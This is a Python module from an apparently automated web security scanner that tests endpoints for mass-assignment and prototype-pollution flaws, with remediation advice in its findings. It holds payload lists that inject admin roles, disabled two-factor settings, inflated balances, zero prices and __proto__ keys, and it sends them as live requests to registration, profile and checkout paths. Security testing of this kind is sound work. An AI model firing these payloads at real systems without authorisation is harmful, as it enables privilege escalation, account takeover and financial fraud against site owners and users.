"""
Mass Assignment / Parameter Pollution Module

Tests for mass assignment vulnerabilities where extra fields in POST/PUT/PATCH requests
can modify server-side object properties that should not be user-controllable.

Technique:
1. Find registration/profile/settings endpoints that accept JSON or form data
2. Send baseline request, then re-send with injected privileged fields
3. Compare responses — if extra fields appear in response or subsequent GET shows changes
4. Detect: role escalation, financial manipulation, account state changes
"""
import asyncio
import json
import logging
import random
from urllib.parse import urlparse, urljoin

import httpx

from app.utils.http_client import make_client, get_random_ua

logger = logging.getLogger(__name__)


# Fields to inject, grouped by attack category
MASS_ASSIGN_FIELDS = {
    "admin_escalation": [
        {"role": "admin"},
        {"is_admin": True},
        {"admin": True},
        {"isAdmin": True},
        {"user_type": "admin"},
        {"permissions": ["*"]},
        {"group": "administrators"},
        {"is_superuser": True},
        {"is_staff": True},
        {"access_level": 999},
        {"user_role": "administrator"},
        {"privilege": "admin"},
        {"type": "admin"},
    ],
    "account_manipulation": [
        {"verified": True},
        {"email_verified": True},
        {"active": True},
        {"banned": False},
        {"two_factor_enabled": False},
        {"password_reset_required": False},
        {"locked": False},
        {"approved": True},
        {"status": "active"},
        {"confirmed": True},
    ],
    "financial": [
        {"balance": 999999},
        {"credits": 999999},
        {"price": 0},
        {"discount": 100},
        {"is_premium": True},
        {"subscription": "enterprise"},
        {"plan": "unlimited"},
        {"trial_ends_at": "2099-12-31"},
        {"free_tier": False},
        {"wallet_balance": 999999},
    ],
    "prototype_pollution": [
        {"__proto__": {"admin": True}},
        {"constructor": {"prototype": {"admin": True}}},
        {"__proto__": {"isAdmin": True}},
    ],
}

# Keywords that identify endpoints likely to accept user data
TARGET_KEYWORDS = [
    "user", "profile", "register", "signup", "sign-up", "account", "settings",
    "update", "edit", "order", "cart", "checkout", "preference", "config",
    "member", "subscription", "billing", "payment", "address", "password",
    "create", "new", "save", "submit",
]


class MassAssignmentModule:
    """Tests for Mass Assignment / Parameter Pollution vulnerabilities."""

    def __init__(self, rate_limit: asyncio.Semaphore = None):
        self.rate_limit = rate_limit or asyncio.Semaphore(5)

    async def run(self, context: dict) -> list[dict]:
        """Run mass assignment tests against discovered endpoints."""
        endpoints = context.get("endpoints", [])
        base_url = context.get("base_url", "")
        auth_cookie = context.get("auth_cookie")
        findings = []

        if not base_url:
            return findings

        # Filter to POST/PUT/PATCH endpoints that likely accept user data
        target_eps = self._select_targets(endpoints, base_url)

        # Also test common registration/profile paths even if not discovered
        common_paths = [
            "/api/register", "/api/signup", "/api/users", "/api/profile",
            "/api/account", "/api/settings", "/api/v1/users", "/api/v1/register",
            "/register", "/signup", "/profile", "/account/settings",
            "/users/profile", "/api/me", "/api/user/update",
        ]
        for path in common_paths:
            full_url = urljoin(base_url, path)
            if not any(ep.get("url") == full_url for ep in target_eps if isinstance(ep, dict)):
                target_eps.append({"url": full_url, "method": "POST", "type": "common_path"})

        # Cap at 15 endpoints
        target_eps = target_eps[:15]

        for ep in target_eps:
            try:
                result = await self._test_mass_assignment(ep, context)
                if result:
                    findings.extend(result)
            except Exception as e:
                logger.debug(f"Mass assignment test error for {ep}: {e}")

        return findings

    def _select_targets(self, endpoints: list, base_url: str) -> list[dict]:
        """Select endpoints likely vulnerable to mass assignment."""
        targets = []
        for ep in endpoints:
            if isinstance(ep, dict):
                url = ep.get("url", "")
                method = ep.get("method", "GET").upper()
                ep_type = ep.get("type", "")
            elif isinstance(ep, str):
                url = ep
                method = "GET"
                ep_type = ""
            else:
                continue

            # Only test POST/PUT/PATCH
            if method not in ("POST", "PUT", "PATCH"):
                continue

            # Check if URL or type matches target keywords
            combined = (url + " " + ep_type).lower()
            if any(kw in combined for kw in TARGET_KEYWORDS):
                if isinstance(ep, str):
                    targets.append({"url": url, "method": method, "type": ep_type})
                else:
                    targets.append(ep)

        return targets

    def _make_client(self, context: dict, **kwargs) -> httpx.AsyncClient:
        """Create HTTP client with auth if available."""
        extra_headers = dict(context.get("custom_headers", {}))
        auth_cookie = context.get("auth_cookie")
        if auth_cookie:
            if auth_cookie.startswith("token="):
                token = auth_cookie.split("=", 1)[1]
                extra_headers["Authorization"] = f"Bearer {token}"
            else:
                extra_headers["Cookie"] = auth_cookie
        return make_client(extra_headers=extra_headers, **kwargs)

    async def _test_mass_assignment(self, ep: dict, context: dict) -> list[dict]:
        """Test a single endpoint for mass assignment vulnerabilities."""
        url = ep.get("url", "")
        method = ep.get("method", "POST").upper()
        if not url:
            return []

        findings = []

        # Step 1: Send baseline request to understand normal behavior
        baseline_body = self._build_baseline_body(url)
        baseline_resp = await self._send_request(url, method, baseline_body, context)
        if not baseline_resp:
            return []

        baseline_status = baseline_resp.get("status")
        baseline_json = baseline_resp.get("json")
        baseline_text = baseline_resp.get("text", "")

        # Step 2: For each field category, inject extra fields
        for category, field_sets in MASS_ASSIGN_FIELDS.items():
            for extra_fields in field_sets:
                try:
                    # Merge extra fields into baseline body
                    injected_body = {**baseline_body, **extra_fields}

                    resp = await self._send_request(url, method, injected_body, context)
                    if not resp:
                        continue

                    # Step 3: Check if injected fields are reflected in response
                    finding = self._analyze_response(
                        url, method, category, extra_fields,
                        baseline_resp, resp, context
                    )
                    if finding:
                        findings.append(finding)
                        # One finding per category is enough for this endpoint
                        break

                    await asyncio.sleep(0.1)  # Rate limiting between attempts

                except Exception as e:
                    logger.debug(f"Mass assignment field test error: {e}")

        # Step 4: Check for prototype pollution (Node.js specific)
        for pp_payload in MASS_ASSIGN_FIELDS["prototype_pollution"]:
            try:
                resp = await self._send_request(url, method, {**baseline_body, **pp_payload}, context)
                if resp and self._detect_prototype_pollution(resp, baseline_resp):
                    findings.append({
                        "title": f"Prototype Pollution via Mass Assignment at {urlparse(url).path}",
                        "url": url,
                        "severity": "critical",
                        "vuln_type": "rce",
                        "description": (
                            f"Prototype pollution detected via mass assignment at {url}. "
                            f"Injecting __proto__ or constructor.prototype fields modifies "
                            f"the JavaScript Object prototype, potentially affecting all "
                            f"objects in the application."
                        ),
                        "impact": (
                            "Prototype pollution can lead to remote code execution, "
                            "authentication bypass, denial of service, and property "
                            "injection across all objects in the application."
                        ),
                        "remediation": (
                            "1. Use Object.create(null) for user-controlled objects. "
                            "2. Freeze Object.prototype. "
                            "3. Sanitize input — strip __proto__ and constructor keys. "
                            "4. Use a schema-based validation library (e.g., Joi, Zod)."
                        ),
                        "payload": json.dumps(pp_payload),
                        "proof": "Server processed __proto__/constructor fields without rejection",
                        "method": method,
                    })
                    break
            except Exception:
                pass

        return findings

    async def _send_request(self, url: str, method: str, body: dict,
                            context: dict) -> dict | None:
        """Send HTTP request and return structured response."""
        async with self.rate_limit:
            try:
                async with self._make_client(context, timeout=10.0) as client:
                    headers = {"Content-Type": "application/json"}

                    if method == "POST":
                        resp = await client.post(url, json=body, headers=headers)
                    elif method == "PUT":
                        resp = await client.put(url, json=body, headers=headers)
                    elif method == "PATCH":
                        resp = await client.patch(url, json=body, headers=headers)
                    else:
                        resp = await client.post(url, json=body, headers=headers)

                    resp_json = None
                    try:
                        resp_json = resp.json()
                    except Exception:
                        pass

                    return {
                        "status": resp.status_code,
                        "text": resp.text[:5000],
                        "json": resp_json,
                        "headers": dict(resp.headers),
                    }

            except httpx.TimeoutException:
                return None
            except Exception as e:
                logger.debug(f"Request error for {url}: {e}")
                return None

    def _build_baseline_body(self, url: str) -> dict:
        """Build a minimal baseline request body based on the URL pattern."""
        path = urlparse(url).path.lower()
        marker = f"phantom{random.randint(10000, 99999)}"

        if any(kw in path for kw in ["register", "signup", "sign-up"]):
            return {
                "username": f"test_{marker}",
                "email": f"test_{marker}@example.com",
                "password": f"TestPass123!_{marker}",
                "name": f"Test User {marker}",
            }
        elif any(kw in path for kw in ["profile", "account", "settings", "user", "me"]):
            return {
                "name": f"Test User {marker}",
                "email": f"test_{marker}@example.com",
            }
        elif any(kw in path for kw in ["order", "cart", "checkout"]):
            return {
                "item_id": "1",
                "quantity": 1,
            }
        else:
            return {
                "name": f"test_{marker}",
                "value": f"test_value_{marker}",
            }

    def _analyze_response(self, url: str, method: str, category: str,
                          injected_fields: dict, baseline_resp: dict,
                          injected_resp: dict, context: dict) -> dict | None:
        """Analyze if the injected fields were accepted by the server."""
        inj_json = injected_resp.get("json")
        inj_text = injected_resp.get("text", "")
        inj_status = injected_resp.get("status")
        base_json = baseline_resp.get("json")
        base_status = baseline_resp.get("status")

        # If server returned error for baseline but success for injected, not useful
        # If server returned same error for both, not vulnerable
        if inj_status and inj_status >= 500:
            return None

        vulnerable = False
        proof_details = []

        for field_name, field_value in injected_fields.items():
            str_value = str(field_value).lower()

            # Check 1: Field reflected in JSON response
            if inj_json and isinstance(inj_json, dict):
                reflected = self._find_in_json(inj_json, field_name, field_value)
                if reflected:
                    # Make sure it's not in the baseline too
                    if base_json and isinstance(base_json, dict):
                        base_reflected = self._find_in_json(base_json, field_name, field_value)
                        if not base_reflected:
                            vulnerable = True
                            proof_details.append(
                                f"Field '{field_name}={field_value}' reflected in response JSON"
                            )

            # Check 2: Field value appears in response text but not in baseline
            if str_value in inj_text.lower() and str_value not in baseline_resp.get("text", "").lower():
                # Avoid false positives from common words
                if str_value not in ("true", "false", "0", "1", "active"):
                    vulnerable = True
                    proof_details.append(
                        f"Value '{field_value}' for field '{field_name}' appears in response"
                    )

            # Check 3: Status code changed favorably (e.g., 403 -> 200)
            if base_status and inj_status:
                if base_status in (401, 403) and inj_status == 200:
                    vulnerable = True
                    proof_details.append(
                        f"Status changed from {base_status} to {inj_status} after injecting {field_name}"
                    )

        if not vulnerable:
            return None

        severity_map = {
            "admin_escalation": "critical",
            "account_manipulation": "high",
            "financial": "high",
            "prototype_pollution": "critical",
        }

        return {
            "title": f"Mass Assignment ({category.replace('_', ' ').title()}) at {urlparse(url).path}",
            "url": url,
            "severity": severity_map.get(category, "high"),
            "vuln_type": "privilege_escalation" if category == "admin_escalation" else "misconfiguration",
            "description": (
                f"Mass assignment vulnerability detected at {url}. "
                f"The server accepts and processes additional fields that were not "
                f"part of the original form/API contract. Category: {category}. "
                f"Evidence: {'; '.join(proof_details)}"
            ),
            "impact": self._impact_for_category(category),
            "remediation": (
                "1. Use allowlists (whitelists) for accepted fields in each endpoint. "
                "2. Never directly bind request data to database models. "
                "3. Use DTOs/serializers that explicitly define writable fields. "
                "4. Implement server-side field filtering (e.g., Rails strong_params, "
                "Django serializer fields, Express schema validation)."
            ),
            "payload": json.dumps(injected_fields),
            "proof": "; ".join(proof_details),
            "method": method,
        }

    def _find_in_json(self, data: dict | list, field_name: str, field_value) -> bool:
        """Recursively search JSON response for the injected field/value."""
        if isinstance(data, dict):
            for key, val in data.items():
                if key == field_name:
                    if isinstance(field_value, bool):
                        if val is field_value or str(val).lower() == str(field_value).lower():
                            return True
                    elif str(val) == str(field_value):
                        return True
                if isinstance(val, (dict, list)):
                    if self._find_in_json(val, field_name, field_value):
                        return True
        elif isinstance(data, list):
            for item in data:
                if isinstance(item, (dict, list)):
                    if self._find_in_json(item, field_name, field_value):
                        return True
        return False

    def _detect_prototype_pollution(self, resp: dict, baseline: dict) -> bool:
        """Check if prototype pollution payload had an effect."""
        # Server didn't reject the __proto__ key (returned 2xx)
        if resp.get("status", 500) < 300:
            resp_json = resp.get("json")
            base_json = baseline.get("json")
            if resp_json and isinstance(resp_json, dict):
                # Check if admin/isAdmin appeared in response
                for key in ("admin", "isAdmin", "is_admin"):
                    if key in resp_json and resp_json[key] is True:
                        if base_json and isinstance(base_json, dict):
                            if key not in base_json or base_json[key] is not True:
                                return True
        return False

    def _impact_for_category(self, category: str) -> str:
        """Return impact description for a finding category."""
        impacts = {
            "admin_escalation": (
                "An attacker can escalate their privileges to admin/superuser level "
                "by injecting role or permission fields during registration or profile update. "
                "This grants full access to the application."
            ),
            "account_manipulation": (
                "An attacker can manipulate account state — bypass email verification, "
                "unlock banned accounts, disable 2FA, or skip approval workflows."
            ),
            "financial": (
                "An attacker can manipulate financial data — set arbitrary account balances, "
                "apply 100% discounts, upgrade to premium subscriptions for free, or "
                "set prices to zero."
            ),
            "prototype_pollution": (
                "Prototype pollution can lead to remote code execution in Node.js applications, "
                "denial of service, or property injection affecting all JavaScript objects."
            ),
        }
        return impacts.get(category, "Mass assignment allows modification of protected fields.")
